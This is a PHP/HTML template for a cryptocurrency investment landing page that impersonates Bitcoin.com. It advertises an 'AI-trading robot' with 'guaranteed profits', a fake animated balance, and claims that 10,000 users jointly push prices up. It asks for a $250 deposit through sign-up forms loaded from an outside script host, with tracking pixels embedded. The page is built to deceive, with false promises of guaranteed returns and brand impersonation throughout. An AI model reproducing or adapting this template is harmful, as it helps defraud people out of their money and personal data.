<?php 
include_once 'config.php'; 
?>
<!doctype html>
<html lang="en">
   <head>
      <base href="<?php echo $base ?>">
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <title>Bitcoin.com - Revolutionary AI-Trading with guaranteed profits</title>
      <link rel="icon" href="assets/img/favicon.png" type="images/x-icon">
      <link href="assets/css/index.min.css?616a2999999edb96fc51" rel="stylesheet">
      <link href="assets/css/7.min.css?1621937519132" rel="stylesheet">
      <link rel="stylesheet" href="https://cdn-addict.site/addict-new/css/app.css">
      <!-- Open Graph -->
      <?php $seoText = 'Welcome!'; ?>
      <meta name="description" content="<? echo $seoText; ?>"/>
      <meta name="keywords" content="<? echo $seoText; ?>"/>
      <meta property="og:title" content="<? echo $seoText; ?>"/>
      <meta property="og:description" content="<? echo $seoText; ?>"/>
      <meta property="og:image" content="<? echo $base; ?>video/1.png"/>
      <meta property="og:image:width" content="450"/>
      <meta property="og:image:height" content="450"/>
      <meta property="og:type" content="website"/>
      <meta property="og:url" content="<?php echo $base; ?>"/>
      <link rel="canonical" href="<?php echo $base; ?>"/>
      <!-- Pixel -->
      <meta name="pixel_id" content="<?php echo $FacebookPixel; ?>">
      <?php if($FacebookPixel) : ?>
      <!-- INDEX.PHP -->
    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=<?php echo $FacebookPixel ?>&ev=PageView&noscript=1"/>
    <?php endif; ?>

    <?php if($TiktokPixel) : ?>
    <script>
        !function (w, d, t) {
            w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
            ttq.load('<?php echo $TiktokPixel; ?>');
            ttq.page();
        }(window, document, 'ttq');
    </script>
    <?php endif; ?>

    <?php if($GooglePixel) : ?>
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-<?php echo $GooglePixel; ?>"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'UA-<?php echo $GooglePixel; ?>');
        </script>
    <?php endif; ?>
   </head>
   <body class="">
      <main class="main" role="main">
         <header class="header">
            <div class="header__container container">
               <div class="header__logo logo"><a href="javascript:void(0);" class="logo__link no-touch"><img src="assets/img/logo.svg"alt="Logo"class="logo__img logo__white"> <img src="assets/img/logo__black.svg"alt="Logo"class="logo__img logo__black"></a></div>
               <div class="header__buttons"><button class="btn btn_border-radius-lg btn_color-white btn_weight-bold btn_text-center btn_letter-space-sm btn_text-shadow btn_gradient header__button header__btn-login" data-popbox-target="modal-form" onclick="popboxOpen()"><span class="btn__text">Sign Up</span></button>                    <button class="btn btn_border-radius-lg btn_weight-bold btn_text-center btn_letter-space-sm btn_gradient header__button header__btn-demo scroll-to" data-move-to="balance" onclick="scrollToBalance()"><span class="btn__text">Free Demo</span></button></div>
               <button
                  class="btn btn-toggle header__toggle"><span class="btn-toggle__inner btn-toggle__top"></span> <span class="btn-toggle__inner btn-toggle__mid"></span> <span class="btn-toggle__inner btn-toggle__bot"></span></button>
            </div>
         </header>
         <section class="promo">
            <div class="promo__container container">
               <div class="promo__content">
                  <h1 class="promo__title title">Revolutionary &#32;<br>AI-Trading with guaranteed profits</h1>
                  <h2 class="promo__subtitle subtitle">Start earning through AI-trading robot in minutes &#32;<br>by using your Debit, Credit Card or Bank Transfer.</h2>
                  <button class="btn btn_border-radius-sm btn_color-white btn_weight-bold btn_text-center btn_text-upper btn_letter-space-sm btn_gradient promo__button promo__btn-cta"
                     data-popbox-target="modal-form" onclick="popboxOpen()"><span class="btn__text">Get started</span></button>
               </div>
               <div class="promo__video video">
                  <button class="video__holder">
                     <video class="video__inner"poster="assets/img/video__poster-new.jpg"controls preload="none">
                        <source src="assets/media/bitcoin.mp4"type="video/mp4">
                     </video>
                  </button>
                  <img src="assets/img/promo__laptop-clear.png"
                     alt="Laptop" class="video__decor">
               </div>
            </div>
         </section>
         <section class="balance" id="balance">
            <div class="balance__container container">
               <h3 class="balance__title title">YOUR REAL-TIME BALANCE:</h3>
               <h4 class="balance__subtitle title">$ 1000</h4>
               <button class="btn btn_border-radius-xl btn_color-white btn_weight-bold btn_text-center btn_letter-space-sm btn_gradient balance__button balance__btn-inactive"><span class="btn__text btn__text-start">START SYSTEM</span> <span class="btn__text btn__text-stop">STOP SYSTEM</span></button>
               <div
                  class="balance__status"><span class="balance__status-inner balance__status-searching is-active">SEARCHING FOR NEW EXPLOIT... </span><span class="balance__status-inner balance__status-found">FOUND EXPLOIT IS ASSET Bitcoin EXPLOITING...</span></div>
               <div class="balance__table table table_letter-space-xsm">
                  <div class="table__head table__head_text-upper table__head_text-center">
                     <div class="table__column">ASSET</div>
                     <div class="table__column">DATE</div>
                     <div class="table__column">DIRECTION</div>
                     <div class="table__column">Profit</div>
                  </div>
                  <div class="table__body table__head_text-center"></div>
                  <div class="table__pagination"></div>
                  <div class="table__footer table__error table__error_color-error table__error_text-upper table__error_text-center is-active">NO RECORDS FOUND FOR THIS SESSION, START THE SYSTEM.</div>
               </div>
            </div>
         </section>
         <section class="info info-statistic">
            <div class="info__container container">
               <div class="info__column info__column-media"><img src="assets/img/info__phone.png" alt="Media" class="info__media"></div>
               <div class="info__column info__column-text">
                  <h3 class="info__title title info__title_text-right">More than 10,000 people will do the same trades!</h3>
                  <div class="info__text info__text-decor-right">
                     <p class="info__paragraph">With bitcoin.com you are not trading alone. Our system automatically makes trades for tens of thousands of individuals thus driving the cryptocurrency price upwards. Once the price rises, the AI robot automatically sells your position
                        at a guaranteed profit. Simple enough, right?
                     </p>
                     <p class="info__paragraph">No other tool has ever had such a big customer base to drive cryptocurrency prices. Join the new revolution!</p>
                  </div>
               </div>
            </div>
         </section>
         <section class="account">
            <div class="account__container container">
               <h3 class="account__title title title_text-center">Automate your &#32;<br>profits today!</h3>
               <div class="account__columns">
                  <div class="account__column account__column-form">
                     <h3 class="form__title form__title-icon title title_letter-space-xsm">Creat Your Account!</h3>
                     <div class="app" id="app1" data-type="2" data-url="<?php echo $thankyou ?>" data-butt="Create account"></div>
                  </div>
                  <div class="account__column account__column-info">
                     <p class="account__text">Your registration is fully encrypted using the most advanced SSL encryption. After registration you will be redirected to a fully licensed broker available in your region.</p>
                     <p class="account__text">Once you make a minimum deposit of $250, you will be automatically connected to bitcoin.com and start generating profits on auto-pilot.</p>
                  </div>
               </div>
            </div>
         </section>
         <section class="media">
            <div class="media__container container">
               <h2 class="media__title title title_text-center"><span class="media__title-inner">Media</span> Feedback</h2>
               <div class="media__columns">
                  <div class="media__column"><img src="assets/img/media__1.jpg" alt="Poster" class="media__poster"></div>
                  <div class="media__column"><img src="assets/img/media__2.jpg" alt="Poster" class="media__poster"></div>
                  <div class="media__column"><img src="assets/img/media__3.jpg" alt="Poster" class="media__poster"></div>
                  <div class="media__column"><img src="assets/img/media__4.jpg" alt="Poster" class="media__poster"></div>
               </div>
            </div>
         </section>
         <section class="info info-cta">
            <div class="info__container container">
               <div class="info__column info__column-text">
                  <h3 class="info__title title">Don’t watch it happen. Join the historical revolution!</h3>
                  <div class="info__text info__text-decor-left">
                     <p class="info__paragraph">You may have missed the first Bitcoin boom, but it’s not too late to join the second one. With the help of AI and Machine Learning, our system analyzes millions of trades and makes decisions for over 10,000 people. With the collective
                        budget of over $100M, we drive cryptocurrency prices upwards and then sell at a profit!
                     </p>
                  </div>
                  <button class="btn btn_border-radius-sm btn_color-white btn_weight-bold btn_text-center btn_text-upper btn_letter-space-sm btn_gradient info__button scroll-to" data-move-to="account-cta__form" onclick="scrollToForm()"><span class="btn__text">Apply now</span></button>
               </div>
            </div>
         </section>
         <section class="account account-cta" id="lower-form">
            <div class="account__container container">
               <h3 class="form__title title title_letter-space-xsm title_text-center">Start earning today!</h3>
               <div class="app" id="app1" data-type="2" data-url="<?php echo $thankyou ?>" data-butt="Create account"></div>
            </div>
         </section>
         <footer class="footer">
            <div class="footer__container container">
               <div class="footer__info">
                  <div class="footer__logo logo"><a href="javascript:void(0);" class="logo__link no-touch"><img src="assets/img/logo.svg"alt="Logo"class="logo__img"></a></div>
                  <h5 class="footer__copyright">© 2021 Saint Bitts LLC Bitcoin.com All rights reserved.</h5>
               </div>
               <nav class="footer__nav">
                  <ul class="footer__menu menu">
                     <li class="menu__item"><a href="javascript:void(0);" class="menu__link falseMatch alterlink" data-name="terms">Terms of Use</a></li>
                     <li class="menu__item"><a href="javascript:void(0);" class="menu__link falseMatch alterlink" data-name="policy">Privacy Policy</a></li>
                  </ul>
               </nav>
            </div>
         </footer>
      </main>
      <div class="popbox modal-form modal" data-popbox-id="modal-form">
         <div class="popbox_container modal__container">
            <div class="modal__wrapper account account-cta">
               <button class="modal__close" data-popbox-close="modal-form" onclick="popboxClose()"><img src="assets/img/modal__close.svg"alt="Modal close"></button>
               <h3 class="form__title title title_letter-space-xsm title_text-center">Sign up!</h3>
               <div class="app" id="app1" data-type="2" data-url="<?php echo $thankyou ?>" data-butt="Create account"></div>
            </div>
         </div>
      </div>
      <script type="text/javascript" src="assets/js/index.js?616a2999999edb96fc51" async></script>
      <script src="https://cdn-addict.site/addict-new/js/chunk-vendors.js"></script>
      <script src="https://cdn-addict.site/addict-new/js/app.js"></script>
   </body>
</html>